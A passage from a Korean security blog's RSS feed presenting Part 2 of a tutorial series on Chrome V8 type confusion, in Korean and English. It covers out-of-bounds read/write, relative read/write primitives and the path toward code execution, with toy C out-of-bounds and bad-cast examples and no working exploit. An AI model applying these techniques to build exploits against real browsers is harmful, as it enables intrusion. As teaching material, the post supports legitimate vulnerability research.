&#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xC9C1;&#xC811; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xAC1D;&#xCCB4; &#xAD6C;&#xC870;&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xB294; &#xC0C1;&#xD669;&#xC774;&#xB77C;&#xBA74;, &#xC774; backing store &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xC784;&#xC758;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xBC84;&#xD37C;&#xC758; &#xC2DC;&#xC791;&#xC810;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0;, ArrayBuffer&#xB97C; &#xD1B5;&#xD55C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xAC00; &#xACE7; &#xC804;&#xCCB4; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;&#xC5D0; &#xB300;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC73C;&#xB85C; &#xD655;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p></li></ul><p>&#xC774;&#xB294; &#xAC1D;&#xCCB4; &#xB0B4;&#xBD80;&#xC758; &#xD544;&#xB4DC; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC798;&#xBABB;&#xB41C; &#xD0C0;&#xC785; &#xD574;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xC870;&#xC791;&#xD568;&#xC73C;&#xB85C;&#xC368;, &#xD574;&#xB2F9; &#xAC1D;&#xCCB4; &#xC778;&#xADFC; &#xBA54;&#xBAA8;&#xB9AC;&#xB098; &#xB3D9;&#xC77C; &#xAD6C;&#xC870;&#xCCB4; &#xB0B4;&#xC758; &#xD2B9;&#xC815; &#xD544;&#xB4DC;&#xC5D0; &#xC81C;&#xD55C;&#xC801;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; &#xB2A5;&#xB825;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; &#xD55C; &#xAC00;&#xC9C0; &#xB354; &#xC911;&#xC694;&#xD55C; &#xC694;&#xC18C;&#xB294; &#xBC14;&#xB85C; &#xAC00;&#xBE44;&#xC9C0; &#xCEEC;&#xB809;&#xD130;(Garbage Collector, GC)&#xC785;&#xB2C8;&#xB2E4;. V8&#xC740; JS &#xAC1D;&#xCCB4;&#xB4E4;&#xC758; &#xC218;&#xBA85;&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xAD00;&#xB9AC;&#xD558;&#xB294; GC &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370;, &#xC774; &#xC2DC;&#xC2A4;&#xD15C;&#xC740; &#xD544;&#xC694;&#xC5D0; &#xB530;&#xB77C; &#xAC1D;&#xCCB4;&#xB97C; &#xD799; &#xB0B4; &#xB2E4;&#xB978; &#xC704;&#xCE58;&#xB85C; &#xC774;&#xB3D9;&#xC2DC;&#xD0A4;&#xAC70;&#xB098; &#xC815;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xAC1D;&#xCCB4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xBC14;&#xB00C;&#xB354;&#xB77C;&#xB3C4;, &#xAE30;&#xC874;&#xC758; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xCF54;&#xB4DC;&#xB294; &#xC774;&#xB97C; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD55C; &#xCC44;, &#xC774;&#xC804; &#xAD6C;&#xC870;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xC744; &#xC2DC;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, GC&#xC640; JIT &#xC0AC;&#xC774;&#xC758; &#xC2DC;&#xCC28; &#xB610;&#xB294; &#xC815;&#xBCF4; &#xBD88;&#xC77C;&#xCE58;&#xB294; &#xB610; &#xD558;&#xB098;&#xC758; Type Confusion &#xD2B8;&#xB9AC;&#xAC70;&#xB85C; &#xC791;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, Type Confusion&#xC740; &#xB2E8;&#xC21C;&#xD55C; &#xB17C;&#xB9AC; &#xC624;&#xB958;&#xB098; &#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xC2E4;&#xC218;&#xAC00; &#xC544;&#xB2CC;, V8&#xC758; JIT &#xCD5C;&#xC801;&#xD654;, &#xAC1D;&#xCCB4; &#xBAA8;&#xB378;, GC &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD558;&#xB294; &#xBCF5;&#xC7A1;&#xD55C; &#xACBD;&#xACC4; &#xC9C0;&#xC810;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC784;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>Type Confusion&#xC774; &#xC65C; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; Memory Corruption&#xC774; &#xCDA9;&#xBD84;&#xD788; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC74C;&#xC744; &#xC54C;&#xC558;&#xC73C;&#xB2C8; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xACF5;&#xACA9;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xC2DC;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-2-Relative-Read-Write-Primitive"><a href="#3-2-Relative-Read-Write-Primitive" class="headerlink" title="3.2 Relative Read/Write Primitive"></a>3.2 Relative Read/Write Primitive</h3><p>Type Confusion &#xC5D0;&#xC11C;&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; exploit &#xD750;&#xB984;&#xC740; Type Confusion &#xC73C;&#xB85C; &#xC778;&#xD55C; OOB R/W &#xB85C;&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. OOB R/W&#xB97C; &#xC798; &#xB2E4;&#xB4EC;&#xC5B4;&#xC11C; Relative R/W primitive&#xB97C; &#xC5BB;&#xACE0; &#xC774;&#xB97C; &#xB610; &#xC798; &#xC774;&#xC6A9;&#xD574;&#xC11C; AAR/W(Arbitary Address Read/Write)&#xB97C; &#xC5BB;&#xC740; &#xD6C4; Code Execution &#xC744; &#xD558;&#xB294; &#xD750;&#xB984;&#xC774; Type Confusion &#xC73C;&#xB85C; RCE&#xB97C; &#xD558;&#xB294; &#xACF5;&#xACA9; &#xD750;&#xB984;&#xC785;&#xB2C8;&#xB2E4; &#x314E;.&#x314E; &#xC815;&#xB9D0; &#xC7AC;&#xBC0C;&#xACA0;&#xC8E0;!! &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xAC00; &#xAE38;&#xC5B4;&#xC838;&#xC11C; &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xB2E4; &#xB2E4;&#xB8E8;&#xC9C0; &#xBABB;&#xD560;&#xAC70; &#xAC19;&#xC9C0;&#xB9CC; &#xC774;&#xB300;&#xB85C; &#xB05D;&#xB0B4;&#xAE30;&#xB294; &#xC544;&#xC26C;&#xC6B0;&#xB2C8;&#xAE4C;, &#xB9DB;&#xBCF4;&#xAE30;&#xB85C; Relative R/W &#xBD80;&#xBD84;&#xB9CC; &#xAC04;&#xB2E8;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; :)</p><hr><p>Type Confusion&#xC740; &#xB2E8;&#xC21C;&#xD55C; &#xC798;&#xBABB;&#xB41C; &#xD0C0;&#xC785; &#xD574;&#xC11D; &#xC774;&#xC0C1;&#xC758; &#xC758;&#xBBF8;&#xB97C; &#xC9C0;&#xB2D9;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC785;&#xC7A5;&#xC5D0;&#xC11C; &#xBCF4;&#xBA74;, &#xC774;&#xB294; &#xC6D0;&#xB798; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xB358; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB294; &#xCD9C;&#xBC1C;&#xC810;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911; &#xB300;&#xD45C;&#xC801;&#xC778; &#xAC83;&#xC774; &#xBC14;&#xB85C; Relative Read/Write&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xC815;&#xD574;&#xC9C4; &#xC624;&#xD504;&#xC14B;&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC81C;&#xD55C;&#xB41C; &#xBC94;&#xC704; &#xB0B4;&#xC5D0;&#xC11C; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD55C; primitive&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xAD6C;&#xC870;&#xAC00; &#xC720;&#xC0AC;&#xD558;&#xC9C0;&#xB9CC; &#xB9C8;&#xC9C0;&#xB9C9; &#xD544;&#xB4DC;&#xC758; &#xC758;&#xBBF8;&#xAC00; &#xB2E4;&#xB978; &#xB450; &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xC0DD;&#xAC01;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="image%207.png" alt="image.png"></p><p>&#xC774; &#xB450; &#xD074;&#xB798;&#xC2A4;&#xB294; &#xD544;&#xB4DC; &#xAC1C;&#xC218;&#xC640; &#xC21C;&#xC11C;&#xB294; &#xC720;&#xC0AC;&#xD558;&#xC9C0;&#xB9CC;, &#xB9C8;&#xC9C0;&#xB9C9; &#xD544;&#xB4DC;&#xC758; &#xC758;&#xBBF8;&#xC640; &#xD0C0;&#xC785;&#xC740; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;.</p><p><code>Worker process</code> &#xC5D0;&#xC11C; <code>Class A</code> &#xC758; &#xC0AC;&#xB294; &#xACF3;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB3D9;&#xC791;&#xC744; &#xD55C;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="image%208.png" alt="image.png"></p><p>&#xC774;&#xC81C; Worker process &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC5B4;&#xB5A4; &#xC774;&#xC720;&#xB85C; <code>Class A</code> &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; <code>Class B</code> &#xD0C0;&#xC785;&#xC73C;&#xB85C; &#xC624;&#xC778;&#xD558;&#xAC8C; &#xB41C; &#xC0C1;&#xD669;&#xC744; &#xAC00;&#xC815;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0;, &#xC815;&#xC0C1;&#xC801;&#xC778; &#xC0C1;&#xD669;&#xC5D0;&#xC11C;&#xB294; &#x201C;&#xC0AC;&#xB294; &#xACF3;&#x201D; &#xD544;&#xB4DC;&#xC5D0; &#xC811;&#xADFC;&#xD574;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, <code>Class B</code> &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD574;&#xC11D;&#xD558;&#xBA74; &#xC774; &#xBA54;&#xBAA8;&#xB9AC; &#xC704;&#xCE58;&#xB294; &#x201C;&#xC77C;&#xD558;&#xB294; &#xACF3;&#x201D;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xD544;&#xB4DC;&#xB85C; &#xC778;&#xC2DD;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image%209.png" alt="image.png"></p><p>&#xADF8; &#xACB0;&#xACFC;, &#xC2E4;&#xC81C;&#xB85C;&#xB294; Worker process&#xB294; <code>Class A</code> &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; &#xD544;&#xB4DC;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xACE0; &#xC788;&#xC9C0;&#xB9CC;, &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB97C; <code>Class B</code>&#xC758; &#xD544;&#xB4DC;&#xB85C; &#xAC04;&#xC8FC;&#xD558;&#xBA74;&#xC11C; &#xC758;&#xB3C4;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xC77D;&#xAC70;&#xB098; &#xC4F0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><blockquote><p>&#xB9CC;&#xC57D;&#xC5D0; &#xC9D1;&#xC73C;&#xB85C; &#xBC30;&#xC1A1;&#xC2DC;&#xCF30;&#xB294;&#xB370;, &#xD68C;&#xC0AC;&#xB85C; &#xD0DD;&#xBC30;&#xAC00; &#xAC00;&#xBA74; &#xACE4;&#xB780;&#xD558;&#xACA0;&#xC8E0;?;;</p><p>&#xB2E4;&#xC74C;&#xC740; &#xB2E4;&#xB978; &#xACE4;&#xB780;&#xD55C; &#xC608;&#xC2DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image.png" alt="image.png"></p></blockquote><p>&#xC774;&#xCC98;&#xB7FC; &#xB7F0;&#xD0C0;&#xC784;&#xC758; &#xC798;&#xBABB;&#xB41C; &#xD0C0;&#xC785; &#xD574;&#xC11D;&#xC740;, <strong>&#xC815;&#xD655;&#xD788; &#xC54C; &#xC218;&#xB294; &#xC5C6;&#xC9C0;&#xB9CC; &#xC77C;&#xC815;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD558;&#xB294; Relative R/W Primitive</strong>&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC790;&#xC2E0;&#xC774; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD55C; &#xAC1D;&#xCCB4;(<code>Class A</code>)&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C;, &#xACE0;&#xC815;&#xB41C; &#xC624;&#xD504;&#xC14B;(&#xC608;: +0x10, +0x18 &#xB4F1;)&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C;,</li><li>&#xBA54;&#xBAA8;&#xB9AC; &#xB0B4; &#xD2B9;&#xC815; &#xD544;&#xB4DC; &#xB610;&#xB294; &#xC778;&#xC811; &#xAD6C;&#xC870;&#xCCB4;(<code>Class B</code>)&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC77D;&#xAC70;&#xB098; &#xC4F8; &#xC218; &#xC788;&#xC74C;</li></ul><hr><p>&#xC774;&#xB7EC;&#xD55C; Relative Primitive&#xB294; &#xACF5;&#xACA9; &#xCD08;&#xAE30; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD55C; &#xC758;&#xBBF8;&#xB97C; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;:</p><ul><li>&#xD2B9;&#xC815; &#xAC1D;&#xCCB4;&#xC758; &#xB0B4;&#xBD80; &#xAD6C;&#xC870;&#xB97C; <strong>leak</strong>&#xD558;&#xAC70;&#xB098;,</li><li>&#xD3EC;&#xC778;&#xD130;&#xB098; &#xAE38;&#xC774; &#xD544;&#xB4DC; &#xB4F1;&#xC758; <strong>&#xD575;&#xC2EC; &#xC815;&#xBCF4;</strong>&#xB97C; &#xC870;&#xC791;&#xD558;&#xC5EC;,</li><li>&#xC774;&#xD6C4; <strong>Absolute R/W Primitive</strong>&#xB85C;&#xC758; &#xD655;&#xC7A5;&#xC744; &#xC704;&#xD55C; &#xBC1C;&#xD310;&#xC744; &#xB9C8;&#xB828;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ul><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB7EC;&#xD55C; Relative R/W Primitive&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC808;&#xB300; &#xC8FC;&#xC18C; &#xAE30;&#xBC18;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC870;&#xC791;&#xC73C;&#xB85C; &#xD655;&#xC7A5;&#xB418;&#xBA70;, &#xAD81;&#xADF9;&#xC801;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC5D0; &#xC774;&#xB974;&#xAC8C; &#xB418;&#xB294;&#xC9C0;&#xB97C; &#xC2E4;&#xC81C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xD750;&#xB984;&#xC744; &#xD1B5;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xBD80;&#xD130;&#xB294; &#xCC10;&#xD55C; Pwnable &#xB0C4;&#xC0C8;&#xAC00; &#xB0A0;&#xAC70; &#xAC19;&#xC740;&#xB370; &#xAE30;&#xB300;&#xD574;&#xC8FC;&#xC138;&#xC694;;;; &#xC5F4;&#xC2EC;&#xD788; &#xC900;&#xBE44;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;!</p><p>(&#xB2E4;&#xC74C;&#xC740; &#xADF8;&#xB0E5; &#xC0AC;&#xC2EC;&#xC73C;&#xB85C; &#xB123;&#xC740; &#xB514;&#xC9C0;&#xD138; &#xD48D;&#xD654;&#xB97C; &#xB9DE;&#xC740; &#xC7A5;&#xB09C;&#xC804;&#xD654; &#xC0AC;&#xC9C4;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xB290;&#xB08C;&#xC744; &#xC4F0;&#xACE0; &#xC2F6;&#xC5C8;&#xB294;&#xB370; &#xB9AC;&#xC554;&#xB2C8;&#xC2A8;&#xACFC; &#xC911;&#xAD6D;&#xC9D1;&#xC740; &#xBABB;&#xCC38;&#xAE34;&#xD558;&#xC8E0; &#x1F975;)</p><p><img src="image%2010.png" alt="image.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>v <strong>Conference Video</strong></p><ul><li><a href="https://www.youtube.com/watch?v=RL2po1swXO4">https://www.youtube.com/watch?v=RL2po1swXO4</a></li></ul><p>v <strong>Background</strong></p><ul><li><a href="https://v8.dev/docs/hidden-classes">https://v8.dev/docs/hidden-classes</a></li><li><a href="https://v8.dev/blog/elements-kinds">https://v8.dev/blog/elements-kinds</a></li><li><a href="https://richardartoul.github.io/jekyll/update/2015/04/26/hidden-classes.html">https://richardartoul.github.io/jekyll/update/2015/04/26/hidden-classes.html</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/OOB/">OOB</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion/">Type Confusion</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion-101/">Type Confusion 101</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chrome/">Chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chromium/">Chromium</category>
      
      <category domain="https://hackyboiz.github.io/tags/Relative-R-W/">Relative R/W</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^☆ Part 2.(EN)</title>
      <link>https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/en/</link>
      <guid>https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/en/</guid>
      <pubDate>Wed, 30 Jul 2025 05:20:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, this is OUYA77. 2025 is already more than halfway over, and July is almost gone too. Time flies, doesn&amp;#x2019;t it? &amp;#x314E;.&amp;#x31</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, this is OUYA77. 2025 is already more than halfway over, and July is almost gone too. Time flies, doesn&#x2019;t it? &#x314E;.&#x314E;</p><p>In this part, I really wanted to take a stab at Chrome exploit development, but because Chrome itself is a complex program with quite a lot of background knowledge required, this post ended up being a bit long. In this section, we&#x2019;ll compare basic <strong>Type Confusion</strong> with Type Confusion in Chrome, and explore how this Type Confusion occurs and ultimately leads to <strong>Memory Corruption</strong>.</p><p>Before we dive in, let&#x2019;s briefly recap what we covered last time.</p><h2 id="0-Part-1-Recap"><a href="#0-Part-1-Recap" class="headerlink" title="0. Part 1. Recap"></a>0. Part 1. Recap</h2><p>Last time, we looked at the overall architecture of Chrome and how frontend resources are processed. To be more precise, we examined the process of HTML, CSS, and JS files being rendered in Chrome. In this research post, we&#x2019;ll focus on <strong>V8</strong>, which handles JS files</p><blockquote><p>If you haven&#x2019;t seen it yet &#x2192; <a href="https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/en/">[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 1.</a></p></blockquote><p><img src="image%201.png" alt="image.png"></p><p>V8 uses various compiler tiers (Ignition, SparkPlug, Maglev, TurboFan) for fast and efficient JavaScript execution, gradually optimizing code and increasing execution speed. However, this optimization is based on the assumption that &#x201C;this structure will always be the same.&#x201D; If an attacker changes the object type or structure at a specific point, V8 will execute incorrect native code based on a false assumption. <strong>This is a typical scenario where Type Confusion occurs.</strong></p><p>Now that we understand the basic structure of how code executes within V8, in the next step, we&#x2019;ll delve into how objects are represented and optimized inside this engine, and furthermore, how this structure can lead to security issues like Type Confusion!</p><h2 id="1-Type-Confusion-101"><a href="#1-Type-Confusion-101" class="headerlink" title="1. Type Confusion 101"></a>1. Type Confusion 101</h2><h3 id="1-1-Introduction"><a href="#1-1-Introduction" class="headerlink" title="1.1 Introduction"></a>1.1 Introduction</h3><p><strong>Type Confusion</strong> is, as the name suggests, a vulnerability that arises when a <strong><code>Type</code></strong> is <strong><code>Confused</code></strong>. So, what exactly do we mean by &#x2018;type&#x2019; here? In computing, a &#x2018;type&#x2019; refers to the method by which data is stored and processed. Simply put, it serves to distinguish the data kind of the variables we use.</p><p>For example:</p><ul><li><strong>Integer:</strong> Stores numerical data</li><li><strong>Char:</strong> Stores single character data</li><li><strong>Array:</strong> Groups multiple data items together</li></ul><p>As seen above, types are the basic units for processing data in programming languages, and for a computer to handle data correctly, the exact type must be specified. But what happens if some data, which should originally be an integer, is mistakenly (or intentionally) treated like a character or an object? The side effects of this cannot be predicted, and the program may behave in unexpected ways.</p><h3 id="1-2-Types-of-&#x201C;Type-Confusion&#x201D;"><a href="#1-2-Types-of-&#x201C;Type-Confusion&#x201D;" class="headerlink" title="1.2 Types of &#x201C;Type Confusion&#x201D;"></a>1.2 Types of &#x201C;Type Confusion&#x201D;</h3><p>Type Confusion, like other vulnerability classifications, can generally be divided into two types based on their impact: <strong>Logical Bug</strong> and <strong>Memory Corruption</strong>.</p><ul><li><strong>Logical Bug</strong></li></ul><p>The <strong>Logical Bug</strong> type of Type Confusion occurs when logic processing, which varies according to type, operates incorrectly. In many languages, operators or built-in methods behave differently depending on the input type. If types are confused, the result can be entirely different from the intended flow. Let&#x2019;s assume the following code is part of a larger application.</p><p><img src="image%202.png" alt="image.png"></p><p>A developer has implemented a filter to prevent XSS by checking if the <code>&lt;</code> character is included in certain input values. The filter was implemented expecting the input to be a string, but what if an array object consisting of strings is actually passed? In JavaScript, if this object is directly checked, the comparison result might be <code>false</code> even if it contains <code>&lt;</code>. This can lead to <strong>filter bypasses</strong> and, as a result, serious logical vulnerabilities such as <strong>XSS (Cross-Site Scripting)</strong> or privilege escalation.</p><ul><li><strong>Memory Corruption</strong></li></ul><p>The <strong>Memory Corruption</strong> type is a critical vulnerability that occurs when a <strong>memory layout is misaligned due to incorrect type casting</strong>. Especially in languages like C/C++, misinterpreting the size or structure of an object can lead to unintended access to adjacent memory (<strong>Out-Of-Bounds Read/Write</strong>). This is a major cause threatening program stability and security.</p><p>For example, let&#x2019;s look at the following code.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    <span class="hljs-keyword">int</span> value[<span class="hljs-number">2</span>];} SmallStruct;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    <span class="hljs-keyword">int</span> data[<span class="hljs-number">4</span>];} LargeStruct;SmallStruct normal = {<span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>};print_memory((<span class="hljs-keyword">int</span>*)&amp;normal , <span class="hljs-keyword">sizeof</span>(normal)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)); <span class="hljs-comment">// Cast SmallStruct array to LargeStruct</span>LargeStruct* confused = (LargeStruct*)&amp;normal ;confused-&gt;data[<span class="hljs-number">2</span>] = <span class="hljs-number">0xdead</span>; <span class="hljs-comment">// OOB Write</span>confused-&gt;data[<span class="hljs-number">3</span>] = <span class="hljs-number">0xbeef</span>;print_memory((<span class="hljs-keyword">int</span>*)&amp;normal, <span class="hljs-keyword">sizeof</span>(LargeStruct)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)); <span class="hljs-comment">// OOB Read</span></code></pre><p>In the example above, <code>SmallStruct</code> is a structure holding two integers. In contrast, <code>LargeStruct</code> contains an array of four integers. If a developer incorrectly casts a <code>SmallStruct</code> instance to a <code>LargeStruct</code> pointer, the program will misinterpret the size of <code>normal</code> based on the memory layout of <code>LargeStruct</code>.</p><p>Looking at the output, </p><p><img src="image%203.png" alt="image.png"></p><p>you can confirm that the area outside the bounds of the <code>SmallStruct</code> structure has been modified by the write operation. That is, <code>confused-&gt;data[2]</code> and <code>data[3]</code> accessed memory beyond the defined structure size of <code>normal</code>.</p><p>This can be visualized as follows.</p><p><img src="image%204.png" alt="image.png"></p><p>The diagram illustrates how, even though the <code>SmallStruct</code> instance occupies only two integer spaces, it is accessed through a <code>LargeStruct</code> pointer as if four integer spaces exist, leading to out-of-bounds read/write operations.</p><h3 id="1-3-Type-Confusion-case-in-Chrome"><a href="#1-3-Type-Confusion-case-in-Chrome" class="headerlink" title="1.3 Type Confusion (case: in Chrome)"></a>1.3 Type Confusion (case: in Chrome)</h3><p>Since we&#x2019;re focusing on Type Confusion in Chrome, we&#x2019;ll further explore how this vulnerability manifests in Chrome by comparing two typical cases of <strong>Memory Corruption</strong> type confusion: C++ and JavaScript.</p><ul><li><strong>Type Confusion &#x2013; C++</strong></li></ul><p>In statically-typed languages like C++, Type Confusion primarily occurs due to developer errors. Since types are determined at compile-time, incorrect explicit casting is the main cause.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Type Confusion caused by incorrect Casting</span>struct A { int x; };struct B { int y; <span class="hljs-keyword">void</span> (*func)(); };A a = {<span class="hljs-number">42</span>};B* b = (B*)&amp;a; <span class="hljs-comment">// Attempts to call an undefined function pointer &#x2192; Crash or arbitrary code execution</span>b-&gt;func();</code></pre><p>In the example above, <code>struct A</code> only contains an integer member <code>x</code>. However, if it&#x2019;s cast to <code>struct B</code>, it will attempt to access a non-existent function pointer (<code>func</code>). This leads to <strong>undefined behavior</strong>, which can result in a system crash or even the execution of attacker-supplied code.</p><ul><li><strong>Type Confusion &#x2013; JavaScript</strong></li></ul><p>On the other hand, in dynamic languages like JavaScript, Type Confusion can occur even without the developer explicitly changing types. Especially in modern JS engines like V8, the <strong>JIT (Just-In-Time) compiler</strong> can make incorrect assumptions during the type inference process for runtime performance optimization, leading to Type Confusion (The details will be covered later!).</p><pre><code class="hljs jsx"><span 